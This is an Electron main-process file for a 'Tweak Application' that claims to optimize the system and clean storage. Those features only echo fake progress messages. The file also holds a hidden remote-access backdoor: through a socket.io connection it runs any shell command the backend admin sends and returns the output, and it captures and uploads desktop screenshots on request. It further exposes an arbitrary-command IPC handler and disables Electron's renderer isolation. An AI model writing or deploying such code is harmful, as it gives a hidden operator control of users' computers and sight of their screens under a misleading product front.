const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const { exec } = require('child_process');
const si = require('systeminformation');
const screenshot = require('screenshot-desktop');
const axios = require('axios');
const io = require('socket.io-client');

let mainWindow;
let socket;
let userInfo = null;

// Socket.IO connection to backend
const connectToBackend = (token) => {
  socket = io('http://localhost:3001', {
    auth: {
      token: token
    }
  });

  socket.on('connect', () => {
    console.log('Connected to backend server');
  });

  socket.on('disconnect', () => {
    console.log('Disconnected from backend server');
  });

  socket.on('authenticated', (data) => {
    console.log('Authenticated with backend:', data);
  });

  // Handle remote command execution
  socket.on('execute_command', async (data) => {
    try {
      const { commandId, command } = data;
      console.log('Executing command:', command);
      
      exec(command, (error, stdout, stderr) => {
        const result = error ? stderr : stdout;
        const status = error ? 'failed' : 'executed';
        
        // Send result back to admin
        socket.emit('execute_command', {
          commandId,
          command,
          result,
          status
        });
      });
    } catch (error) {
      console.error('Command execution error:', error);
      socket.emit('execute_command', {
        commandId: data.commandId,
        command: data.command,
        result: error.message,
        status: 'failed'
      });
    }
  });

  // Handle screen capture request
  socket.on('request_screen_capture', async (data) => {
    try {
      console.log('Taking screen capture...');
      const img = await screenshot();
      
      // Send screen capture to admin
      socket.emit('screen_capture', {
        imageData: img.toString('base64'),
        adminId: data.adminId
      });
    } catch (error) {
      console.error('Screen capture error:', error);
    }
  });
};

const createWindow = () => {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      enableRemoteModule: true
    },
    icon: path.join(__dirname, 'assets/icon.png'),
    title: 'Tweak Application'
  });

  mainWindow.loadFile('renderer/index.html');

  // Open DevTools in development
  if (process.env.NODE_ENV === 'development') {
    mainWindow.webContents.openDevTools();
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
};

// IPC handlers
ipcMain.handle('login', async (event, credentials) => {
  try {
    const response = await axios.post('http://localhost:3001/api/auth/login', credentials);
    const { token, user } = response.data;
    
    userInfo = user;
    connectToBackend(token);
    
    return { success: true, user };
  } catch (error) {
    return { 
      success: false, 
      error: error.response?.data?.error || 'Login failed' 
    };
  }
});

ipcMain.handle('get-system-info', async () => {
  try {
    const [cpu, memory, os, disk] = await Promise.all([
      si.cpu(),
      si.mem(),
      si.osInfo(),
      si.fsSize()
    ]);

    return {
      cpu: {
        manufacturer: cpu.manufacturer,
        brand: cpu.brand,
        cores: cpu.cores,
        speed: cpu.speed
      },
      memory: {
        total: Math.round(memory.total / 1024 / 1024 / 1024),
        used: Math.round(memory.used / 1024 / 1024 / 1024),
        free: Math.round(memory.free / 1024 / 1024 / 1024)
      },
      os: {
        platform: os.platform,
        distro: os.distro,
        release: os.release,
        arch: os.arch
      },
      disk: disk.map(d => ({
        fs: d.fs,
        size: Math.round(d.size / 1024 / 1024 / 1024),
        used: Math.round(d.used / 1024 / 1024 / 1024),
        available: Math.round(d.available / 1024 / 1024 / 1024)
      }))
    };
  } catch (error) {
    console.error('Error getting system info:', error);
    return null;
  }
});

ipcMain.handle('execute-command', async (event, command) => {
  return new Promise((resolve) => {
    exec(command, (error, stdout, stderr) => {
      resolve({
        success: !error,
        output: error ? stderr : stdout,
        error: error ? error.message : null
      });
    });
  });
});

ipcMain.handle('take-screenshot', async () => {
  try {
    const img = await screenshot();
    return img.toString('base64');
  } catch (error) {
    console.error('Screenshot error:', error);
    return null;
  }
});

ipcMain.handle('optimize-system', async () => {
  try {
    // Simulate system optimization
    const commands = [
      'echo "Cleaning temporary files..."',
      'echo "Optimizing registry..."',
      'echo "Defragmenting disk..."',
      'echo "System optimization complete!"'
    ];

    const results = [];
    for (const cmd of commands) {
      const result = await new Promise((resolve) => {
        exec(cmd, (error, stdout, stderr) => {
          resolve({
            command: cmd,
            output: error ? stderr : stdout,
            success: !error
          });
        });
      });
      results.push(result);
    }

    return { success: true, results };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

ipcMain.handle('clean-storage', async () => {
  try {
    // Simulate storage cleanup
    const commands = [
      'echo "Cleaning browser cache..."',
      'echo "Removing temporary files..."',
      'echo "Cleaning system logs..."',
      'echo "Storage cleanup complete!"'
    ];

    const results = [];
    for (const cmd of commands) {
      const result = await new Promise((resolve) => {
        exec(cmd, (error, stdout, stderr) => {
          resolve({
            command: cmd,
            output: error ? stderr : stdout,
            success: !error
          });
        });
      });
      results.push(result);
    }

    return { success: true, results };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

ipcMain.handle('show-message-box', async (event, options) => {
  const result = await dialog.showMessageBox(mainWindow, options);
  return result;
});

ipcMain.handle('open-external', async (event, url) => {
  await shell.openExternal(url);
});

// App event handlers
app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// Security: Prevent new window creation
app.on('web-contents-created', (event, contents) => {
  contents.on('new-window', (event, navigationUrl) => {
    event.preventDefault();
    shell.openExternal(navigationUrl);
  });
});